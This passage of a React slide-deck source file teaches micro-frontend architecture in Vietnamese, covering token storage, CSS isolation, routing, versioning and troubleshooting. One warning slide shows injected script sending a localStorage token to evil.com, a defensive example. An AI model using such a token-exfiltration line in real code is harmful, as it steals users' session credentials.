                    <span className="text-[var(--accent-red)]">⚠️</span> Vấn đề bảo mật với localStorage
                </h2>
                <div className="grid grid-cols-2 gap-4">
                    <motion.div className="glass p-5 rounded-lg border-2 border-[var(--accent-red)]/50" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                        <h4 className="text-[var(--accent-red)] font-bold mb-3">❌ Nguy hiểm: XSS có thể đọc</h4>
                        <CodeBlock
                            title="Đừng làm thế này!"
                            language="typescript"
                            showLineNumbers={false}
                            code={`// XSS attack có thể đọc được!
localStorage.setItem('token', 'eyJhbGc...');

// Attacker inject script:
const token = localStorage.getItem('token');
fetch('https://evil.com?token=' + token);`}
                        />
                    </motion.div>
                    <motion.div className="glass p-5 rounded-lg border-2 border-[var(--accent-green)]/50" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.1 }}>
                        <h4 className="text-[var(--accent-green)] font-bold mb-3">✅ An toàn hơn: Memory Storage</h4>
                        <Table
                            headers={['Token', 'Storage', 'JS Access?']}
                            rows={[
                                ['Access Token', 'Memory (JS var)', '✅ Yes'],
                                ['Refresh Token', 'httpOnly Cookie', '❌ No'],
                            ]}
                        />
                    </motion.div>
                </div>
            </div>
        ),
    },

    // Slide 27: TokenStore Implementation
    {
        id: 27,
        title: 'TokenStore Class',
        section: 'Phần 5: Security',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">In-Memory Token Storage</h2>
                <CodeBlock
                    title="shared/utils/tokenStore.ts"
                    language="typescript"
                    code={`class TokenStore {
  // Private variable - KHÔNG thể access từ bên ngoài
  #accessToken: string | null = null;

  set(token: string) {
    this.#accessToken = token; // Lưu trong V8 Heap
  }

  get(): string | null {
    return this.#accessToken;
  }

  clear() {
    this.#accessToken = null;
  }
}

// Singleton instance
export const tokenStore = new TokenStore();`}
                    highlightLines={[2, 3, 6]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-cyan)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <strong className="text-[var(--accent-cyan)]">💡 Lưu ý:</strong> Dùng <code>#privateField</code> (ES2022) thay vì <code>private</code> TypeScript để bảo vệ thực sự tại runtime.
                </motion.div>
            </div>
        ),
    },

    // Slide 28: Defense in Depth
    {
        id: 28,
        title: 'Defense in Depth',
        section: 'Phần 5: Security',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">🛡️ Defense in Depth Strategy</h2>
                <div className="space-y-4">
                    {[
                        { layer: '1', title: 'Prevent XSS', desc: 'CSP headers, sanitize input, Content-Security-Policy', color: 'blue' },
                        { layer: '2', title: 'httpOnly Cookie', desc: 'Protect refresh token - JS không thể đọc', color: 'green' },
                        { layer: '3', title: 'In-memory Storage', desc: 'Access token trong memory, khó truy cập hơn localStorage', color: 'purple' },
                        { layer: '4', title: 'Short-lived Tokens', desc: 'Access token hết hạn nhanh (15-30 phút), limit damage', color: 'orange' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.layer}
                            className={`glass p-4 rounded-lg border-l-4 border-[var(--accent-${item.color})] flex items-center gap-4`}
                            initial={{ opacity: 0, x: -30 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: i * 0.1 }}
                        >
                            <span className={`text-2xl font-bold text-[var(--accent-${item.color})]`}>{item.layer}</span>
                            <div>
                                <h4 className={`font-bold text-[var(--accent-${item.color})]`}>{item.title}</h4>
                                <p className="text-sm text-[var(--text-secondary)]">{item.desc}</p>
                            </div>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 6: CSS ISOLATION (Slides 29-35)
    // ==========================================

    // Slide 29: CSS Problem
    {
        id: 29,
        title: 'Vấn đề CSS Conflict',
        section: 'Phần 6: CSS Isolation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">
                    <span className="text-[var(--accent-red)]">⚠️</span> Vấn đề CSS Conflict trong MFE
                </h2>
                <CodeBlock
                    title="Vấn đề: Class name trùng"
                    language="css"
                    code={`/* remote1/Button.css */
.btn { background: red; padding: 10px; }

/* remote2/Button.css */
.btn { background: blue; padding: 20px; }

/* → Khi cả 2 remote load vào host: CONFLICT!
   → Kết quả: .btn cuối cùng sẽ "thắng" */`}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-red)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <strong className="text-[var(--accent-red)]">Tại sao xảy ra?</strong> CSS là global scope. Khi nhiều remote apps load vào cùng 1 page, tất cả CSS merge thành 1 → class name trùng = conflict!
                </motion.div>
            </div>
        ),
    },

    // Slide 30: CSS Isolation Diagram
    {
        id: 30,
        title: 'CSS Isolation Strategies',
        section: 'Phần 6: CSS Isolation',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">CSS Isolation Strategies</h2>
                <CSSIsolationDiagram />
            </div>
        ),
    },

    // Slide 31: CSS Solutions Comparison
    {
        id: 31,
        title: 'So sánh CSS Solutions',
        section: 'Phần 6: CSS Isolation',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">So sánh các giải pháp CSS</h2>
                <Table
                    headers={['Giải pháp', 'Isolation', 'Setup', 'Developer Experience']}
                    rows={[
                        ['<span class="text-[var(--accent-green)] font-bold">CSS Modules</span> ✅', '<span class="text-[var(--accent-green)]">Tốt</span>', 'Zero config', 'DX tuyệt vời - viết CSS bình thường'],
                        ['<span class="text-[var(--accent-purple)]">CSS-in-JS</span>', '<span class="text-[var(--accent-green)]">Tốt</span>', 'Cài lib', 'Phải học syntax mới, runtime cost'],
                        ['<span class="text-[var(--accent-orange)]">BEM Convention</span>', '<span class="text-[var(--accent-orange)]">Trung bình</span>', 'Không cần', 'Phụ thuộc discipline của team'],
                        ['<span class="text-[var(--accent-cyan)]">Shadow DOM</span>', '<span class="text-[var(--accent-green)]">Hoàn hảo</span>', 'Phức tạp', 'Khó debug, ảnh hưởng React'],
                    ]}
                />
                <motion.div className="mt-4 glass p-4 rounded-lg border-2 border-[var(--accent-green)]/50 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-green)]">🏆 Recommend:</strong> CSS Modules - Zero config, zero runtime, syntax quen thuộc, hỗ trợ type-safe với TypeScript!
                </motion.div>
            </div>
        ),
    },

    // Slide 32: CSS Modules Example
    {
        id: 32,
        title: 'CSS Modules - Ví dụ',
        section: 'Phần 6: CSS Isolation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">CSS Modules - Code Example</h2>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="Button.module.css"
                        language="css"
                        showLineNumbers={false}
                        code={`.btn {
  background: red;
  padding: 10px;
}

.btnPrimary {
  background: blue;
}`}
                    />
                    <CodeBlock
                        title="Button.tsx"
                        language="tsx"
                        showLineNumbers={false}
                        code={`import styles from './Button.module.css';

const Button = ({ primary }) => (
  <button className={
    primary ? styles.btnPrimary : styles.btn
  }>
    Click me
  </button>
);

// Output HTML:
// <button class="Button_btn_a1b2c3">`}
                    />
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-green)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.2 }}>
                    <strong className="text-[var(--accent-green)]">✅ Kết quả:</strong> Class name tự động unique (<code>Button_btn_a1b2c3</code>) → Không conflict!
                </motion.div>
            </div>
        ),
    },

    // Slide 33: CSS-in-JS Example
    {
        id: 33,
        title: 'CSS-in-JS Example',
        section: 'Phần 6: CSS Isolation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">Styled Components - Code Example</h2>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="Button.tsx"
                        language="tsx"
                        showLineNumbers={false}
                        code={`import styled from 'styled-components';

const StyledButton = styled.button\`
  background: \${p => p.primary ? 'blue' : 'red'};
  padding: 10px;
  
  &:hover {
    opacity: 0.8;
  }
\`;

// Output: <button class="sc-bdfBQB kTzXmj">`}
                    />
                    <div className="space-y-4">
                        <motion.div className="glass p-4 rounded-lg" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }}>
                            <h4 className="text-[var(--accent-green)] font-bold mb-2">✅ Ưu điểm</h4>
                            <ul className="text-xs text-[var(--text-secondary)] space-y-1">
                                <li>• Dynamic styles dễ dàng</li>
                                <li>• Co-located với component</li>
                                <li>• Full CSS support</li>
                            </ul>
                        </motion.div>
                        <motion.div className="glass p-4 rounded-lg" initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.1 }}>
                            <h4 className="text-[var(--accent-red)] font-bold mb-2">❌ Nhược điểm</h4>
                            <ul className="text-xs text-[var(--text-secondary)] space-y-1">
                                <li>• Runtime cost</li>
                                <li>• Cần share lib trong MFE</li>
                                <li>• Học syntax mới</li>
                            </ul>
                        </motion.div>
                    </div>
                </div>
            </div>
        ),
    },

    // Slide 34: Global CSS Handling
    {
        id: 34,
        title: 'Xử lý Global CSS',
        section: 'Phần 6: CSS Isolation',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Ai quản lý Global CSS?</h2>
                <Table
                    headers={['Loại CSS', 'Ai quản lý', 'Cách làm']}
                    rows={[
                        ['Reset/Normalize', '<span class="text-[var(--accent-blue)] font-bold">Host only</span>', 'Import 1 lần ở host'],
                        ['Design Tokens', '<span class="text-[var(--accent-purple)] font-bold">Shared</span>', 'CSS Variables ở :root'],
                        ['Component Styles', '<span class="text-[var(--accent-green)] font-bold">Mỗi Remote</span>', 'CSS Modules'],
                        ['Utility Classes', '<span class="text-[var(--accent-orange)] font-bold">Host hoặc Shared</span>', 'Tailwind với prefix'],
                    ]}
                />
                <CodeBlock
                    title="host/global.css"
                    language="css"
                    showLineNumbers={false}
                    code={`@import 'normalize.css';

:root {
  --primary-color: #1890ff;
  --font-family: 'Inter', sans-serif;
}

/* Remote KHÔNG nên có global styles! */`}
                />
            </div>
        ),
    },

    // Slide 35: BEM + Shadow DOM
    {
        id: 35,
        title: 'BEM & Shadow DOM',
        section: 'Phần 6: CSS Isolation',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">Các giải pháp khác</h2>
                <div className="grid grid-cols-2 gap-4">
                    <div>
                        <h4 className="text-[var(--accent-orange)] font-bold mb-2">BEM Naming Convention</h4>
                        <CodeBlock
                            title="BEM Example"
                            language="css"
                            showLineNumbers={false}
                            code={`/* remote1 - Users App */
.users-btn { }
.users-btn--primary { }
.users-card__header { }

/* remote2 - Products App */
.products-btn { }
.products-card { }`}
                        />
                    </div>
                    <div>
                        <h4 className="text-[var(--accent-cyan)] font-bold mb-2">Shadow DOM (Advanced)</h4>
                        <CodeBlock
                            title="Shadow DOM"
                            language="tsx"
                            showLineNumbers={false}
                            code={`const host = ref.current;
const shadow = host.attachShadow({ 
  mode: 'open' 
});

// Styles hoàn toàn isolated
shadow.innerHTML = \`
  <style>.btn { ... }</style>
  <button class="btn">Click</button>
\`;`}
                        />
                    </div>
                </div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 7: ROUTING (Slides 36-39)
    // ==========================================

    // Slide 36: Routing Diagram
    {
        id: 36,
        title: 'Routing trong MFE',
        section: 'Phần 7: Routing',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Routing trong MFE</h2>
                <RoutingFlowDiagram />
            </div>
        ),
    },

    // Slide 37: History Synchronization
    {
        id: 37,
        title: 'History Synchronization',
        section: 'Phần 7: Routing',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">
                    <span className="text-[var(--accent-orange)]">⚠️</span> History Synchronization
                </h2>
                <motion.div className="glass p-4 rounded-lg border-2 border-[var(--accent-red)]/50 mb-6" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <h4 className="text-[var(--accent-red)] font-bold">Vấn đề phổ biến nhất khi làm MFE!</h4>
                    <p className="text-sm text-[var(--text-secondary)]">
                        Khi navigate từ Host → Remote, nút Back/Forward của browser có thể không hoạt động đúng nếu không đồng bộ history object.
                    </p>
                </motion.div>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="Host App - Truyền history"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Host truyền history cho Remote
<RemoteApp 
  history={window.history}
  basename="/products" 
/>`}
                    />
                    <CodeBlock
                        title="Remote App - Nhận history"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Remote sử dụng history từ Host
export function mount({ history, basename }) {
  const router = createBrowserRouter({
    basename,
    history // QUAN TRỌNG!
  });
}`}
                    />
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-green)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-green)]">💡 Giải pháp:</strong> Remote App phải sử dụng cùng history object với Host, không tự tạo history mới.
                </motion.div>
            </div>
        ),
    },

    // Slide 38: Single History Pattern
    {
        id: 38,
        title: 'Single History Instance',
        section: 'Phần 7: Routing',
        variant: 'code',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">Routing: Single History Pattern</h2>
                <motion.div className="glass p-4 rounded-lg mb-4 border border-[var(--accent-blue)]/30" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <p className="text-sm"><strong className="text-[var(--accent-blue)]">Nguyên tắc:</strong> Chỉ có 1 history instance. Host sở hữu và share cho remotes.</p>
                </motion.div>
                <div className="grid grid-cols-2 gap-4">
                    <CodeBlock
                        title="shared/history.ts"
                        language="typescript"
                        showLineNumbers={false}
                        code={`import { createBrowserHistory } from 'history';

// Singleton - tất cả apps dùng chung
export const history = createBrowserHistory();`}
                    />
                    <CodeBlock
                        title="Remote sử dụng"
                        language="tsx"
                        showLineNumbers={false}
                        code={`// Remote nhận history từ props
const ProductsApp = ({ history, basePath }) => (
  <Router history={history}>
    <Routes>
      <Route path={\`\${basePath}/list\`} 
             element={<ProductList />} />
    </Routes>
  </Router>
);`}
                    />
                </div>
            </div>
        ),
    },

    // Slide 39: Lazy Load Routes
    {
        id: 39,
        title: 'Lazy Load Remote Routes',
        section: 'Phần 7: Routing',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">Pattern: Lazy Load Remote Components</h2>
                <CodeBlock
                    title="host/pages/products/index.tsx"
                    language="tsx"
                    code={`import { Suspense, lazy } from 'react';
import { useHistory } from 'umi';

// Lazy load từ remote
const ProductGrid = lazy(() => import('remote2/ProductGrid'));

const ProductsPage = () => {
  const history = useHistory();
  
  return (
    <Suspense fallback={<Loading />}>
      <ProductGrid 
        onProductClick={(id) => history.push(\`/products/\${id}\`)}
      />
    </Suspense>
  );
};`}
                    highlightLines={[5, 11, 12, 13]}
                />
            </div>
        ),
    },

    // ==========================================
    // PHẦN 8: DEVOPS (Slides 40-42)
    // ==========================================

    // Slide 40: CI/CD Pipeline
    {
        id: 40,
        title: 'CI/CD Pipeline',
        section: 'Phần 8: DevOps',
        variant: 'diagram',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">CI/CD Pipeline for MFE</h2>
                <CICDPipelineDiagram />
            </div>
        ),
    },

    // Slide 41: Versioning Strategy
    {
        id: 41,
        title: 'Versioning Strategy',
        section: 'Phần 8: DevOps',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-4">
                    <span className="text-[var(--accent-purple)]">📦</span> Versioning Strategy
                </h2>
                <motion.div className="glass p-4 rounded-lg border border-[var(--accent-blue)]/30 mb-6" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
                    <h4 className="text-[var(--accent-blue)] font-bold">Câu hỏi Senior thường hỏi:</h4>
                    <p className="text-sm text-[var(--text-secondary)]">
                        Khi deploy Remote mới, Host làm sao biết có version mới? Cache như thế nào?
                    </p>
                </motion.div>
                <div className="grid grid-cols-3 gap-4">
                    {[
                        { title: '1. Manifest File', desc: 'manifest.json chứa version + hash. Host fetch định kỳ.', example: '{ "version": "1.2.3" }', color: 'green' },
                        { title: '2. Query Param', desc: 'Thêm timestamp/hash vào URL để bust cache.', example: 'remoteEntry.js?v=1702700000', color: 'orange' },
                        { title: '3. Content Hash', desc: 'Tên file chứa hash: remoteEntry.abc123.js', example: 'output.filename: [contenthash]', color: 'cyan' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.title}
                            className="glass p-5 rounded-lg"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: i * 0.1 }}
                        >
                            <h4 className={`text-[var(--accent-${item.color})] font-bold mb-2`}>{item.title}</h4>
                            <p className="text-xs text-[var(--text-secondary)] mb-2">{item.desc}</p>
                            <div className="bg-[#282a36] p-2 rounded text-xs font-mono">{item.example}</div>
                        </motion.div>
                    ))}
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg border border-[var(--accent-green)]/30 text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.4 }}>
                    <strong className="text-[var(--accent-green)]">💡 Recommend:</strong> Kết hợp Content Hash + Manifest để vừa cache tốt vừa dễ rollback.
                </motion.div>
            </div>
        ),
    },

    // Slide 42: Testing Strategy
    {
        id: 42,
        title: 'Testing Strategy',
        section: 'Phần 8: DevOps',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Chiến lược Testing cho MFE</h2>
                <div className="grid grid-cols-3 gap-4">
                    {[
                        { icon: '🔬', title: 'Unit Tests', items: ['Vitest / Jest', 'Test isolated components', 'Mock remote imports', 'Fast feedback'], color: 'blue' },
                        { icon: '🔗', title: 'Integration Tests', items: ['Testing Library', 'Test host + remotes', 'Mock network', 'CI/CD integration'], color: 'green' },
                        { icon: '🌐', title: 'E2E Tests', items: ['Playwright / Cypress', 'Full stack testing', 'Real remotes', 'Slow but thorough'], color: 'purple' },
                    ].map((group, i) => (
                        <motion.div
                            key={group.title}
                            className="glass p-5 rounded-lg"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: i * 0.1 }}
                        >
                            <div className="text-2xl mb-2">{group.icon}</div>
                            <h4 className={`text-[var(--accent-${group.color})] font-bold mb-3`}>{group.title}</h4>
                            <ul className="text-xs text-[var(--text-secondary)] space-y-1">
                                {group.items.map((item, j) => <li key={j}>• {item}</li>)}
                            </ul>
                        </motion.div>
                    ))}
                </div>
                <motion.div className="mt-4 glass p-4 rounded-lg text-sm" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.3 }}>
                    <strong className="text-[var(--accent-cyan)]">💡 Tip:</strong> Mock remotes trong Unit/Integration tests. Chỉ dùng real remotes trong E2E.
                </motion.div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 9: TROUBLESHOOTING (Slides 43-45)
    // ==========================================

    // Slide 43: Common Errors
    {
        id: 43,
        title: 'Troubleshooting',
        section: 'Phần 9: Troubleshooting',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Lỗi thường gặp & Cách fix</h2>
                <Table
                    headers={['Lỗi', 'Nguyên nhân', 'Cách fix']}
                    rows={[
                        ['<span class="text-[var(--accent-red)]">Shared module not found</span>', 'Version mismatch', 'Check requiredVersion'],
                        ['<span class="text-[var(--accent-red)]">Invalid hook call</span>', 'Multiple React instances', 'Set singleton: true'],
                        ['<span class="text-[var(--accent-red)]">Failed to fetch</span>', 'Remote server down', 'Add Error Boundary'],
                        ['<span class="text-[var(--accent-red)]">CSS conflict</span>', 'Global CSS', 'Use CSS Modules'],
                        ['<span class="text-[var(--accent-red)]">Back button broken</span>', 'Multiple history', 'Share single history'],
                    ]}
                />
            </div>
        ),
    },

    // Slide 44: Error Boundary
    {
        id: 44,
        title: 'Error Boundary Pattern',
        section: 'Phần 9: Troubleshooting',
        variant: 'code',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-4">Xử lý lỗi khi Remote fail</h2>
                <CodeBlock
                    title="RemoteWrapper.tsx"
                    language="tsx"
                    code={`class RemoteErrorBoundary extends React.Component {
  state = { hasError: false };

  static getDerivedStateFromError() {
    return { hasError: true };
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="error-fallback">
          <p>Remote không khả dụng</p>
          <button onClick={() => window.location.reload()}>
            Thử lại
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}`}
                    highlightLines={[9, 10, 11, 12, 13, 14, 15, 16]}
                />
            </div>
        ),
    },

    // Slide 45: Performance Tips
    {
        id: 45,
        title: 'Performance Optimization',
        section: 'Phần 9: Troubleshooting',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">Tối ưu Performance</h2>
                <div className="grid grid-cols-2 gap-4">
                    <motion.div className="glass p-5 rounded-lg" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
                        <h4 className="text-[var(--accent-green)] font-bold mb-3">✅ Nên làm</h4>
                        <ul className="text-sm text-[var(--text-secondary)] space-y-2">
                            <li>• <strong>Lazy load</strong> remote components</li>
                            <li>• <strong>Prefetch</strong> remoteEntry.js</li>
                            <li>• <strong>Cache</strong> với content hash</li>
                            <li>• <strong>Share</strong> heavy dependencies</li>
                            <li>• <strong>Code split</strong> trong remotes</li>
                        </ul>
                    </motion.div>
                    <motion.div className="glass p-5 rounded-lg" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}>
                        <h4 className="text-[var(--accent-red)] font-bold mb-3">❌ Tránh</h4>
                        <ul className="text-sm text-[var(--text-secondary)] space-y-2">
                            <li>• Load tất cả remotes lúc start</li>
                            <li>• Duplicate large dependencies</li>
                            <li>• Too many small remotes</li>
                            <li>• Eager load everything</li>
                            <li>• Skip Error Boundary</li>
                        </ul>
                    </motion.div>
                </div>
            </div>
        ),
    },

    // ==========================================
    // PHẦN 10: SUMMARY (Slides 46-50)
    // ==========================================

    // Slide 46: Key Takeaways
    {
        id: 46,
        title: 'Tổng kết',
        section: 'Phần 10: Summary',
        variant: 'section',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">Tổng kết - Key Takeaways</h2>
                <div className="space-y-3">
                    {[
                        { title: 'Micro-Frontend', desc: 'Chia app lớn thành apps nhỏ, deploy độc lập', color: 'blue' },
                        { title: 'Module Federation', desc: 'Load modules từ remote server tại runtime', color: 'purple' },
                        { title: 'Host (Ứng dụng Cha)', desc: 'App chính consume modules từ remotes', color: 'green' },
                        { title: 'Remote (Ứng dụng Con)', desc: 'App con expose modules cho host', color: 'orange' },
                        { title: 'CSS Modules', desc: 'Recommend cho CSS isolation, zero config', color: 'cyan' },
                        { title: 'Event Bus', desc: 'Communication giữa các MFE, loose coupling', color: 'pink' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.title}
                            className={`glass p-4 rounded-xl border-l-4 border-[var(--accent-${item.color})]`}
                            initial={{ opacity: 0, x: -30 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: i * 0.08 }}
                        >
                            <h3 className={`font-bold text-[var(--accent-${item.color})]`}>{item.title}</h3>
                            <p className="text-sm text-[var(--text-secondary)]">{item.desc}</p>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // Slide 47: Best Practices Checklist
    {
        id: 47,
        title: 'Best Practices Checklist',
        section: 'Phần 10: Summary',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">MFE Best Practices Checklist</h2>
                <div className="grid grid-cols-2 gap-4">
                    {[
                        { category: 'Configuration', items: ['React: singleton=true', 'Shared dependencies đầy đủ', 'Version matching'] },
                        { category: 'CSS', items: ['CSS Modules hoặc CSS-in-JS', 'Host owns global CSS', 'Remote scoped styles'] },
                        { category: 'Routing', items: ['Single history instance', 'Lazy load remotes', 'Error Boundary'] },
                        { category: 'Communication', items: ['Event Bus pattern', 'Type-safe events', 'Avoid tight coupling'] },
                    ].map((group, i) => (
                        <motion.div
                            key={group.category}
                            className="glass p-4 rounded-lg"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: i * 0.1 }}
                        >
                            <h4 className="text-[var(--accent-cyan)] font-bold mb-3">{group.category}</h4>
                            <ul className="text-sm text-[var(--text-secondary)] space-y-1">
                                {group.items.map((item, j) => (
                                    <li key={j} className="flex items-center gap-2">
                                        <span className="text-[var(--accent-green)]">✓</span> {item}
                                    </li>
                                ))}
                            </ul>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // Slide 48: Qiankun vs Module Federation
    {
        id: 48,
        title: 'Qiankun vs Module Federation',
        section: 'Phần 10: Summary',
        content: (
            <div className="w-full max-w-5xl mx-auto">
                <h2 className="text-slide-header mb-6">So sánh: Qiankun vs Module Federation</h2>
                <Table
                    headers={['Tiêu chí', 'Qiankun', 'Module Federation']}
                    rows={[
                        ['Approach', 'Runtime sandbox', 'Build-time + Runtime'],
                        ['Isolation', 'Sandbox hoàn toàn', 'Tùy config shared'],
                        ['Bundle Size', 'Mỗi app full bundle', 'Share dependencies'],
                        ['Learning Curve', 'Cao (nhiều concepts)', 'Trung bình'],
                        ['Framework', 'Any (Vue, React, Angular)', 'Chủ yếu React/Webpack'],
                        ['Use Case', 'Enterprise, legacy', 'Greenfield, same stack'],
                    ]}
                />
            </div>
        ),
    },

    // Slide 49: Resources
    {
        id: 49,
        title: 'Tài liệu tham khảo',
        section: 'Phần 10: Summary',
        content: (
            <div className="w-full max-w-4xl mx-auto">
                <h2 className="text-slide-header mb-6">📚 Tài liệu tham khảo</h2>
                <div className="grid grid-cols-2 gap-4">
                    {[
                        { title: 'Webpack Docs', url: 'webpack.js.org/concepts/module-federation/', color: 'blue' },
                        { title: 'Module Federation Examples', url: 'github.com/module-federation/module-federation-examples', color: 'green' },
                        { title: 'UmiJS Plugin MF', url: 'umijs.org/docs/max/mf', color: 'purple' },
                        { title: 'Vite Plugin Federation', url: 'github.com/originjs/vite-plugin-federation', color: 'orange' },
                    ].map((item, i) => (
                        <motion.div
                            key={item.title}
                            className={`glass p-4 rounded-lg border border-[var(--accent-${item.color})]/30`}
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            transition={{ delay: i * 0.1 }}
                        >
                            <h4 className={`text-[var(--accent-${item.color})] font-bold mb-1`}>{item.title}</h4>
                            <p className="text-xs text-[var(--text-muted)] break-all">{item.url}</p>
                        </motion.div>
                    ))}
                </div>
            </div>
        ),
    },

    // Slide 50: Thank You
    {
        id: 50,
        title: 'Cảm ơn!',
        section: 'End',
        variant: 'title',
        content: (
            <div className="text-center">
                <motion.div
                    className="text-6xl mb-8 font-bold text-[var(--accent-purple)]"
                    animate={{ scale: [1, 1.05, 1] }}
                    transition={{ repeat: Infinity, duration: 3 }}
                >
                    Q&A
                </motion.div>
                <motion.h1
                    className="text-slide-title mb-6"
                    initial={{ opacity: 0, scale: 0.8 }}
                    animate={{ opacity: 1, scale: 1 }}
                >
                    Cảm ơn đã lắng nghe!
                </motion.h1>
                <motion.p
                    className="text-slide-body text-[var(--text-secondary)] mb-8"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.3 }}
                >
                    Questions & Discussion
                </motion.p>
                <motion.div
                    className="flex justify-center gap-4"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 0.5 }}
                >
                    <span className="glass px-6 py-3 rounded-full">
                        <span className="text-[var(--accent-blue)]">←</span>
                        <span className="text-[var(--accent-purple)]">→</span> Navigate
                    </span>
                    <span className="glass px-6 py-3 rounded-full">
                        <span className="text-[var(--accent-cyan)]">F</span> Fullscreen
                    </span>
                    <span className="glass px-6 py-3 rounded-full">
                        <span className="text-[var(--accent-green)]">T</span> TOC
                    </span>
                </motion.div>
            </div>
        ),
    },
];

export const tocItems = slides.map((slide) => ({
    title: slide.title,
    slideIndex: slide.id - 1,
    section: slide.section,
}));
